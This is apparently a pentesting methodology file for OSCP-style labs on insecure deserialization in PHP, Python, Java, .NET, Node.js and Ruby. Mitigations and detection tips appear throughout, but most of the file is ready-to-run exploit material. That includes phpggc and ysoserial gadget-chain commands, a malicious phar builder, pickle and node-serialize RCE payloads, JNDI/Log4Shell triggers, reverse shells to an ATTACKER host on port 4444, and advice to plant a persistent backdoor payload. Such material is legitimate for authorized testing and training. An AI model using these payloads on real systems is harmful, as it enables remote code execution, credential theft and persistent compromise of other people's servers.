# Deserialization

> Deserialization vulnerabilities occur when an application reconstructs an
> object from untrusted data without validation. Depending on the language
> and library, this can lead to remote code execution (RCE), authentication
> bypass, or denial of service. Java, PHP, Python, .NET, Node.js, and Ruby
> each have distinct gadget chains and exploitation paths. This file covers
> detection, exploitation, and OSCP evidence for each ecosystem.
>
> Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for
> production, [PROD-RISK] use with care, [PROD-NO] do not run against
> production.

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection](#3-detection)
- [4. PHP Deserialization](#4-php-deserialization)
- [5. Python Pickle](#5-python-pickle)
- [6. Java Deserialization](#6-java-deserialization)
- [7. .NET Deserialization](#7-net-deserialization)
- [8. Node.js Deserialization](#8-nodejs-deserialization)
- [9. Ruby Marshal](#9-ruby-marshal)
- [10. Tools](#10-tools)
- [11. Post-Exploitation](#11-post-exploitation)
- [12. OSCP Notes](#12-oscp-notes)
- [13. Cheatsheet](#13-cheatsheet)
- [14. References](#14-references)

---

## 1. Overview

Deserialization = converting bytes back into in-memory objects. If those
bytes are attacker-controlled and the language allows object instantiation
from data, the attacker can construct arbitrary objects (gadget chains)
that execute code on deserialization.

**Languages and their serialization formats:**

| Language | Format | Magic bytes | Primary tool |
|----------|--------|-------------|--------------|
| Java | Java Serialization | `AC ED 00 05` | ysoserial |
| PHP | PHP `serialize()` | `O:` or `a:` (text) | phpggc |
| Python | pickle | `80 02..05` | pickletools, custom |
| Python | PyYAML (unsafe) | `!!python/` | manual |
| .NET | BinaryFormatter | `00 01 00 00` | ysoserial.net |
| .NET | ViewState | n/a (base64) | ysoserial.net, ViewGen |
| Node.js | node-serialize | `_$$ND_FUNC$$_` | node-serialize RCE |
| Ruby | Marshal | `04 08` | universal gadget |
| Ruby | YAML (unsafe) | `!ruby/` | manual |

**Impact:**

- Remote code execution (RCE).
- Authentication bypass.
- Denial of service (object graph bombs).
- File read / write.
- Privilege escalation via gadget chains.

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Send detection-only chain (URLDNS) | [PROD-RISK] |
| Send RCE chain (ysoserial, phpggc) | [PROD-NO] |
| Reverse shell | [PROD-NO] |

### 2.2 What NOT to do (production)

- Do NOT send RCE chains to production without explicit approval.
- Do NOT send DoS-prone payloads (object graph bombs) - they can crash the target.
- Do NOT rely on a single gadget chain; if it fails, do not retry aggressively.
- Do NOT leave deserialization payloads in logs or persistent stores.

In production, prove deserialization with a detection-only chain (URLDNS,
OOB DNS) and stop.

### 2.3 Rate limiting

Deserialization payloads are single requests. Do not fuzz aggressively.

---

## 3. Detection

Deserialization is often invisible in HTTP traffic. Look for:

- **Binary blobs** in cookies, request bodies, or hidden form fields.
- **Base64 strings** that decode to binary with magic bytes:
  - Java: `AC ED 00 05` (hex) or `rO0AB` (base64 prefix).
  - .NET: `AAEAAAD/////` (base64 prefix of BinaryFormatter).
  - PHP: `O:4:"User":...` or `a:2:{...}` (serialized object/array).
  - Python pickle: `\x80\x04` or `\x80\x05` (hex `80 04`/`80 05`) or `gASV` (base64).
  - Ruby Marshal: `\x04\x08` (hex) or `BAh` (base64 prefix).
- **`Content-Type: application/x-java-serialized-object`** in requests.
- **ViewState** parameter in .NET (form field `__VIEWSTATE`).
- **Cookies** named `session`, `auth`, `data`, `token`, `remember` with
  base64/binary values.
- **RMI, JMX, T3, IIOP** traffic on the wire (Java middleware).
- **`ObjectInputStream.readObject()`** in stack traces.

### 3.1 Quick detection

```bash
# Look for known magic bytes in cookies / bodies
curl -s $TARGET/ -c cookies.txt
grep -oE "rO0AB[A-Za-z0-9+/=]+" cookies.txt
grep -oE "AAEAAAD[A-Za-z0-9+/=]+" cookies.txt

# Decode a candidate (Java)
echo "rO0AB..." | base64 -d | xxd | head

# Python pickle
echo "gASV..." | base64 -d | xxd | head
```

Expected output (Java):

```text
00000000: aced 0005 7372 0012 636f 6d2e 6578  ....sr..com.ex
```

### 3.2 Magic bytes reference

| Signal | Language | Next step |
|--------|----------|-----------|
| `rO0AB` base64 prefix | Java | ysoserial, gadget chain |
| `AC ED 00 05` bytes | Java | ysoserial |
| `O:4:"User":...` | PHP | phpggc |
| `a:2:{...}` | PHP (array) | Deserialize check |
| `gASV` base64 prefix | Python pickle | pickle RCE |
| `\x80\x04` / `\x80\x05` | Python pickle (proto 4/5) | pickle RCE |
| `AAEAAAD` base64 prefix | .NET | ysoserial.net |
| `__VIEWSTATE` field | .NET | ViewState decode |
| `BAh` base64 prefix | Ruby | Marshal RCE |
| `application/x-java-serialized-object` | Java HTTP | ysoserial |

---

## 4. PHP Deserialization

### 4.1 Detection

Look for PHP-serialized strings in cookies, hidden form fields, or request bodies:

```text
O:4:"User":2:{s:4:"name";s:5:"alice";s:4:"role";s:5:"user";}
a:2:{s:4:"user";s:5:"alice";s:4:"role";s:5:"admin";}
```

Base64-encoded: `Tzo0OiJVc2VyIj...`

### 4.2 Format

- `s:N:"value";` - string.
- `i:N;` - integer.
- `a:N:{...}` - array (N = count).
- `O:N:"Class":M:{...}` - object (N = class name length, M = property count).

### 4.3 Magic methods

When an object is deserialized, PHP calls:

- `__wakeup()` - on `unserialize()`.
- `__destruct()` - on object destruction.
- `__toString()` - on string cast.
- `__call()` - on undefined method call.

Vulnerable classes have dangerous actions in these methods (file write,
command execution, SQL).

### 4.4 Exploitation with phpggc

```bash
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# List available chains
./phpggc -l

# Generate payload (Laravel RCE)
./phpggc Laravel/RCE9 system 'id' -b

# Generate (Symfony)
./phpggc Symfony/RCE4 exec 'curl http://ATTACKER/$(id)' -b
```

Send as a cookie or request body:

```bash
curl -s -b "session=$(./phpggc Laravel/RCE9 system 'id' -b)" $TARGET/
```

Expected output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4.5 Phar deserialization

A `phar://` file access can trigger deserialization even without explicit
`unserialize()`:

```bash
# Create malicious phar
php -d phar.readonly=0 -r "
class Exploit { function __destruct() { system(\$_GET['c']); } }
\$p = new Phar('/tmp/e.phar');
\$p->startBuffering();
\$p->addFromString('x', '');
\$p->setStub('<?php __HALT_COMPILER(); ?>');
\$p['x'] = new Exploit();
\$p->stopBuffering();
"

# Upload /tmp/e.phar to target, then trigger with phar://
curl "$TARGET/index.php?file=phar://uploads/e.phar/x&c=id"
```

> [!IMPORTANT]
> OSCP report: screenshot the serialized payload, the send request, and the RCE output (or OOB callback).

**Mitigation:** never `unserialize()` untrusted data; use `json_decode`; if
unavoidable, whitelist `allowed_classes`.

---

## 5. Python Pickle

### 5.1 Detection

- `pickle.loads`, `cPickle`, `dill`, `joblib` in code or stack traces.
- Binary payloads starting with `\x80\x04` (proto 4) or `\x80\x05` (proto 5).
- Base64 `gASV...` (proto 4) or `gA...` (proto 2).
- Cookies/session data with binary or base64 blobs.
- Django session cookie with `PickleSerializer` (rare but exists).

### 5.2 Exploit

Pickle executes `__reduce__` on load, which can run arbitrary code.

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
print(payload.hex())
# Send as raw bytes or base64
```

**Reverse shell via pickle:**

```python
import pickle, os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))

print(pickle.dumps(RCE()))
```

### 5.3 YAML unsafe load (PyYAML < 5.1)

```yaml
!!python/object/apply:os.system ["id"]
```

Load with `yaml.load(data)` (not `safe_load`):

```python
import yaml
yaml.load('!!python/object/apply:os.system ["id"]')
```

> [!IMPORTANT]
> OSCP report: screenshot the payload generation, the request, and the RCE output (or reverse shell).

**Mitigation:** use `json` instead of pickle; never `yaml.load()` without
`SafeLoader`; for pickle, only load data from trusted sources.

---

## 6. Java Deserialization

### 6.1 Detection

- HTTP body with `Content-Type: application/x-java-serialized-object`.
- Cookie value starting with `rO0AB` (base64 of `AC ED 00 05`).
- RMI / JMX / T3 / IIOP ports (1099, 1090, 7001, 7002, 4444).
- Error messages: `java.io.ObjectInputStream`, `ClassNotFoundException`.
- `.ser` files in exposed directories.

### 6.2 Serialization format

A serialized Java object starts with:

```text
AC ED 00 05
```

Then a stream of class descriptors and field values. Tools parse and
reconstruct this.

### 6.3 Common gadget chains

- **CommonsCollections 1-7** (Apache Commons Collections < 3.2.2, < 4.1).
- **CommonsBeanutils 1** (commons-beanutils < 1.9.4).
- **Groovy 1** (Groovy < 2.4.4).
- **Spring 1-2** (spring-core, spring-beans).
- **Hibernate 1-2**.
- **JRMPClient** (JNDI lookup to attacker).
- **URLDNS** (detection-only, no RCE).

### 6.4 Exploitation with ysoserial

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections5 'curl http://ATTACKER/$(id)' > payload.bin

# Base64 for HTTP
base64 -w0 payload.bin > payload.b64

# Send to target
curl -s -X POST $TARGET/api/deserialize --data-binary @payload.bin -H "Content-Type: application/x-java-serialized-object"
```

Expected OOB callback:

```text
GET /uid=33(www-data) HTTP/1.1
Host: ATTACKER
```

**Reverse shell payload:**

```bash
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDQ0IDA+JjE=}|{base64,-d}|bash' > payload.bin
```

### 6.5 Blind Java deserialization (DNS)

When RCE is not immediate, use `URLDNS` to confirm deserialization:

```bash
java -jar ysoserial.jar URLDNS 'http://UNIQUE.ATTACKER' > urldns.bin
```

A DNS hit from the target confirms the endpoint deserializes.

### 6.6 JNDI injection (Log4Shell and friends)

If the target uses JNDI lookup on user input:

```bash
# Start a malicious LDAP server
java -jar JNDIExploit.jar -i ATTACKER

# Trigger
curl -H "User-Agent: ${jndi:ldap://ATTACKER:1389/Basic/Command/Base64/<base64_cmd>}" $TARGET/
```

> [!IMPORTANT]
> OSCP report: screenshot the payload generation, the send request, the OOB callback (DNS or HTTP), and the RCE proof. Include the ysoserial chain name.

**Mitigation:** never deserialize untrusted data; use a whitelist
(`ObjectInputFilter` in Java 9+); prefer JSON/protobuf; upgrade
Commons-Collections.

---

## 7. .NET Deserialization

### 7.1 Detection

- `__VIEWSTATE` in ASP.NET WebForms (base64 + sometimes encrypted).
- Binary body with `AAEAAAD/////` (base64 prefix of BinaryFormatter).
- `Content-Type: application/octet-stream` on ASP.NET endpoints.
- `TypeNameHandling` != `None` in JSON.NET (Newtonsoft).
- `LosFormatter`, `BinaryFormatter`, `SoapFormatter`,
  `NetDataContractSerializer` in stack traces.
- MachineKey exposure -> forge ViewState.

### 7.2 ViewState (WebForms)

If `machineKey` is leaked (in `web.config`, error pages, or via
`machineKey` disclosure bugs), forge a ViewState with RCE.

```bash
# ysoserial.net: generate ViewState payload
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --path="/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<key>" --validationalg="SHA1" --validationkey="<key>"
```

If `machineKey` is not known, generate an unsigned ViewState:

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --generator=MachinesPageKey --validationkey=auto --decryptionalg=3DES
```

Then `__VIEWSTATE=<output>` in a POST.

### 7.3 BinaryFormatter

Any endpoint reading a serialized object via `BinaryFormatter.Deserialize`
is exploitable.

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "cmd /c calc"
```

### 7.4 JSON.NET (TypeNameHandling)

If the API accepts JSON with `$type` and `TypeNameHandling.All`:

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd", "/c calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System.Diagnostics"
  }
}
```

> [!IMPORTANT]
> OSCP report: screenshot the forged ViewState / payload, the send request, and the RCE output.

**Mitigation:** do not use `BinaryFormatter`; disable `TypeNameHandling` in
JSON.NET; rotate `machineKey`; use `SerializationBinder`.

---

## 8. Node.js Deserialization

### 8.1 node-serialize

The `node-serialize` library evaluates `_$$ND_FUNC$$_function(){...}()` on
deserialize.

**Payload:**

```json
{
  "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id', function(e,o){console.log(o)});}()"
}
```

Base64 for cookie:

```bash
echo -n '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\",function(e,o){console.log(o)});}()"}' | base64
```

### 8.2 Other libraries

- `serialize-to-js` (older versions).
- `funcster` (CVE-2020-7660, prototype pollution to RCE).
- `cryo` (prototype pollution).

### 8.3 Prototype pollution to RCE

Some deserializers accept `__proto__` fields, leading to prototype pollution:

```json
{"__proto__": {"polluted": "yes"}}
```

If the app uses polluted properties in a sink (`child_process.spawn`,
`require`), RCE follows.

> [!IMPORTANT]
> OSCP report: screenshot the payload, the request, and the RCE output.

**Mitigation:** never use `node-serialize`; use `JSON.parse`; freeze
`Object.prototype`.

---

## 9. Ruby Marshal

### 9.1 Detection

- Cookie or body starting with `BAh` (base64 of `\x04\x08`).
- Ruby app (Rails, Sinatra) with `Marshal.load` on user data.

### 9.2 Universal gadget (Ruby 2.x / 3.x)

Multiple public chains exist. One common approach uses `Gem::Requirement`
and `Gem::Package::TarReader`.

**Payload (Ruby 2.x):**

```ruby
# universal gadget - use a public PoC (e.g. from GitHub: ruby-marshal-rce)
# The chain executes `eval` via a method call on a crafted object.
```

For OSCP, prefer well-known PoCs:

```bash
git clone https://github.com/2lambda123/ruby-marshal-rce
# Follow README to generate payload
```

Send base64-encoded Marshal data as a cookie.

> [!IMPORTANT]
> OSCP report: screenshot the payload, the send request, and the RCE output.

**Mitigation:** never `Marshal.load` untrusted data; use JSON.

---

## 10. Tools

| Tool | Language | Purpose |
|------|----------|---------|
| ysoserial | Java | Generate Java gadget chains |
| ysoserial.net | .NET | Generate .NET gadget chains |
| phpggc | PHP | Generate PHP gadget chains |
| pickle | Python | Manual pickle payloads |
| ysoserial (Ruby) | Ruby | Ruby Marshal (limited) |
| marshalsec | Java | JNDI / LDAP / RMI exploit server |
| JNDIExploit | Java | Ready-made JNDI exploitation |
| ViewGen | .NET | Generate ViewState payloads |
| Burp Java Deserialization Scanner | Java | Detect serialized data |
| Freddy (Burp) | Java | Deserialization scanner |

### 10.1 ysoserial (Java)

```bash
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn clean package -DskipTests
java -jar target/ysoserial-*.jar
```

### 10.2 phpggc

```bash
git clone https://github.com/ambionics/phpggc.git
cd phpggc
./phpggc -l
```

### 10.3 ysoserial.net

```bash
# Download release
# https://github.com/pwntester/ysoserial.net/releases
ysoserial.exe -h
```

### 10.4 marshalsec (JNDI)

```bash
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests
java -cp target/marshalsec-*.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER:8000/#Exploit"
```

---

## 11. Post-Exploitation

After RCE via deserialization:

1. **Establish a stable shell:** base64-encoded reverse shell in the payload.
2. **Enumerate the host:** `id`, `hostname`, `uname -a`, `env`.
3. **Check app secrets:** `config`, `appsettings.json`, `web.config`, `.env`.
4. **Read DB credentials:** often in env or config; test lateral movement.
5. **Pivot to internal services:** the app's service account may have broader access.
6. **Persist:** some apps re-load serialized state on restart - keep a backdoor payload.

```bash
# Java example: base64 reverse shell
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDQ0IDA+JjE=}|{base64,-d}|bash' > payload.bin

# Send, then catch shell with nc -lvnp 4444
```

---

## 12. OSCP Notes

> [!IMPORTANT]
> OSCP report evidence for deserialization:
> - Screenshot the detection (binary magic bytes, base64 prefix, cookie).
> - Screenshot the payload generation command (ysoserial, phpggc, etc.).
> - Screenshot the request with the payload.
> - Screenshot the RCE proof (command output, reverse shell, or OOB callback).
> - For OOB: include the DNS/HTTP log with timestamp.
> - Include timestamps in every screenshot.
>
> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

> [!IMPORTANT]
> Start with a detection-only chain (URLDNS for Java) to confirm
> deserialization. Only escalate to RCE after confirmation. This minimizes
> the risk of crashing the target.

> [!IMPORTANT]
> If the payload goes through a base64-encoded cookie, screenshot BOTH the
> raw payload and the base64 form. Some graders want to see the exact bytes
> transmitted.

**Common OSCP pitfalls:**

- Java gadget chains depend on the libraries on the classpath. Test multiple
  chains (CommonsCollections 5, 6, 3, CommonsBeanutils 1).
- PHP `unserialize` may be called implicitly via `phar://` - test file
  functions with `phar://` wrapper.
- Python pickle is protocol-sensitive; use protocol 2 for older Python,
  4/5 for newer.
- .NET ViewState must match the target's `machineKey`, `decryptionAlg`, and
  `validationAlg`. If unknown, look for disclosure endpoints.
- `ysoserial.net` requires Windows or Wine; some chains only work on Windows.
- `node-serialize` is often filtered by WAFs - use URL-encoding if needed.

---

## 13. Cheatsheet

```text
Detection prefixes:
  Java:    AC ED 00 05 (hex)  /  rO0AB (base64)
  .NET:    AAEAAAD///// (base64)
  PHP:     O:4:"User":...  /  a:2:{...}
  Python:  \x80\x04  /  \x80\x05  /  gASV (base64)
  Ruby:    \x04\x08 (hex)  /  BAh (base64)
```

```bash
# Java: ysoserial
java -jar ysoserial.jar CommonsCollections5 'id' > payload.bin

# PHP: phpggc
./phpggc Laravel/RCE9 system 'id' -b

# .NET: ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "cmd /c calc"

# Python: pickle
python3 -c 'import pickle, os; print(pickle.dumps(type("E",(),{"__reduce__":lambda s:(os.system,("id",))})()))'

# Node.js: node-serialize
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)});}()"}
```

---

## 14. References

- OWASP Deserialization Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- PortSwigger Insecure Deserialization - https://portswigger.net/web-security/deserialization
- HackTricks Java Deserialization - https://book.hacktricks.xyz/pentesting-web/deserialization
- ysoserial (Java) - https://github.com/frohoff/ysoserial
- ysoserial.net - https://github.com/pwntester/ysoserial.net
- phpggc - https://github.com/ambionics/phpggc
- marshalsec - https://github.com/mbechler/marshalsec
- JNDIExploit - https://github.com/feihong-cs/JNDIExploit
- ViewGen - https://github.com/0xacb/viewgen
- CVE-2015-4852 (WebLogic T3 deserialization) - https://nvd.nist.gov/vuln/detail/CVE-2015-4852
- CVE-2015-7501 (Commons Collections RCE) - https://nvd.nist.gov/vuln/detail/CVE-2015-7501
- CVE-2021-44228 (Log4Shell) - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- CVE-2020-14882 (WebLogic Console RCE) - https://nvd.nist.gov/vuln/detail/CVE-2020-14882
- CVE-2019-2725 (WebLogic wls9-async) - https://nvd.nist.gov/vuln/detail/CVE-2019-2725
- CVE-2020-7660 (serialize-javascript RCE) - https://nvd.nist.gov/vuln/detail/CVE-2020-7660
- CVE-2013-0156 (Rails YAML deserialization) - https://nvd.nist.gov/vuln/detail/CVE-2013-0156

---

*Part of Bugterium. English only by design. Last updated: 2026-10-14.*

> See also: [SSTI.md](./SSTI.md), [Command-Injection.md](./Command-Injection.md)
